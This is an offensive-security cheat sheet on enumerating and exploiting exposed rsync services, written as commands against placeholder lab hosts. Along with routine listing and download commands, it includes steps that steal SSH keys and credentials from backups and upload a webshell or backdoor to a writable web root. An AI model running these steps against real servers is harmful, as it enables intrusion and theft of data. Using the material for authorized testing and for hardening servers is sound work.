# Rsync (Port 873)

Enumerate and exploit Rsync file synchronization service to access shared files and directories.
Rsync is used for efficient file transfer and synchronization, commonly found on backup servers and file sharing systems.

## Quick Reference

### List Modules
```bash
# Netcat banner grab
nc -nv 10.10.10.10 873

# Nmap
nmap -sV --script rsync-list-modules -p 873 10.10.10.10

# Rsync
rsync --list-only rsync://10.10.10.10/
```

### Download Files
```bash
# List files in module
rsync -av --list-only rsync://10.10.10.10/module_name

# Download entire module
rsync -av rsync://10.10.10.10/module_name ./local_dir/
```

## Banner Grabbing

### Manual Enumeration with Netcat
```bash
nc -nv 10.10.10.10 873

# Server responds with:
@RSYNCD: 31.0

# Send back same version:
@RSYNCD: 31.0

# Request module list:
#list

# Server enumerates modules:
raidroot
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID
@RSYNCD: EXIT
```

### Check Specific Module
```bash
nc -nv 10.10.10.10 873
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot

# If authentication required:
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g
```

## Enumeration

### Nmap Scripts
```bash
# List available modules
nmap -sV --script rsync-list-modules -p 873 10.10.10.10

# Brute force modules
nmap --script rsync-brute -p 873 10.10.10.10
```

### Metasploit
```bash
# Rsync module scanner
use auxiliary/scanner/rsync/modules_list
set RHOSTS 10.10.10.10
run
```

## Rsync Commands

### List Modules (No Authentication)
```bash
# List available modules
rsync --list-only rsync://10.10.10.10/

# Alternative syntax
rsync rsync://10.10.10.10/
```

### List Files in Module
```bash
# List files without authentication
rsync -av --list-only rsync://10.10.10.10/module_name

# With custom port
rsync -av --list-only rsync://10.10.10.10:8730/module_name
```

### Download Files (No Authentication)
```bash
# Download entire module
rsync -av rsync://10.10.10.10/module_name ./local_dir/

# Download specific file
rsync -av rsync://10.10.10.10/module_name/file.txt ./

# With custom port
rsync -av rsync://10.10.10.10:8730/module_name ./local_dir/
```

### With Authentication
```bash
# List with credentials
rsync -av --list-only rsync://username@10.10.10.10/module_name

# Download with credentials
rsync -av rsync://username@10.10.10.10/module_name ./local_dir/

# Specify password in environment
export RSYNC_PASSWORD='password'
rsync -av rsync://username@10.10.10.10/module_name ./local_dir/
```

### Upload Files
```bash
# Upload file to module
rsync -av ./local_file.txt rsync://10.10.10.10/module_name/

# Upload directory
rsync -av ./local_dir/ rsync://10.10.10.10/module_name/
```

## Rsync over SSH

### Using SSH Transport
```bash
# Rsync over SSH (default port 22)
rsync -av -e ssh user@10.10.10.10:/remote/path ./local_dir/

# Custom SSH port
rsync -av -e "ssh -p 2222" user@10.10.10.10:/remote/path ./local_dir/

# With SSH key
rsync -av -e "ssh -i ~/.ssh/id_rsa" user@10.10.10.10:/remote/path ./local_dir/
```

## IPv6 Support
```bash
# List modules via IPv6
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730/

# Download via IPv6
rsync -av rsync://[dead:beef::250:56ff:feb9:e90a]:8730/module ./local_dir/
```

## Common Workflow

### Full Rsync Enumeration
```bash
# 1. Discover rsync service
nmap -p 873 10.10.10.10

# 2. List available modules
rsync --list-only rsync://10.10.10.10/

# 3. Enumerate each module
rsync -av --list-only rsync://10.10.10.10/module1
rsync -av --list-only rsync://10.10.10.10/module2

# 4. Download interesting files
rsync -av rsync://10.10.10.10/module1 ./module1_backup/

# 5. Search for sensitive data
grep -r "password" ./module1_backup/
find ./module1_backup/ -name "*.conf" -o -name "*.key" -o -name "id_rsa"

# 6. If write access, upload webshell or backdoor
rsync -av ./shell.php rsync://10.10.10.10/webroot/
```

## Exploitation Scenarios

### Backup Server Access
```bash
# Download backup files
rsync -av rsync://10.10.10.10/backups ./backups/

# Search for credentials
grep -r "password\|credential\|secret" ./backups/
```

### Web Root Access
```bash
# If module points to web root
rsync -av --list-only rsync://10.10.10.10/www

# Upload webshell
rsync -av ./shell.php rsync://10.10.10.10/www/
```

### SSH Key Theft
```bash
# Download home directories
rsync -av rsync://10.10.10.10/home ./home_backup/

# Search for SSH keys
find ./home_backup/ -name "id_rsa" -o -name "id_dsa"
```

## Notes

**Authentication:**
- Many rsync servers allow anonymous access
- Authentication uses username/password
- Password can be set via RSYNC_PASSWORD environment variable
- Some modules require authentication, others don't

**Security Considerations:**
- Rsync often exposes sensitive backup data
- May contain credentials, SSH keys, database dumps
- Write access allows file upload (webshells, backdoors)
- No encryption by default (use rsync over SSH)
- Often misconfigured with overly permissive access

**Common Misconfigurations:**
- Anonymous access to sensitive modules
- Write access to web directories
- Exposing home directories
- Backup files with credentials
- No authentication required
- Exposed to internet

**Module Types:**
- Backup modules (often contain sensitive data)
- Web root modules (upload webshells)
- Home directory modules (SSH keys, credentials)
- Configuration modules (system configs)

**Rsync vs Rsync over SSH:**
- Rsync daemon (port 873) - Native rsync protocol
- Rsync over SSH - Uses SSH for transport (encrypted)
- SSH method requires SSH credentials
- Daemon method may allow anonymous access

**Useful Rsync Options:**
- `-a` - Archive mode (preserves permissions, timestamps)
- `-v` - Verbose output
- `-z` - Compress during transfer
- `-P` - Show progress and keep partial files
- `--list-only` - List files without downloading
- `-e ssh` - Use SSH as transport
- `--port` - Specify custom port

**File Permissions:**
- Downloaded files preserve original permissions
- May need to adjust permissions after download
- SUID/SGID bits are preserved with -a flag
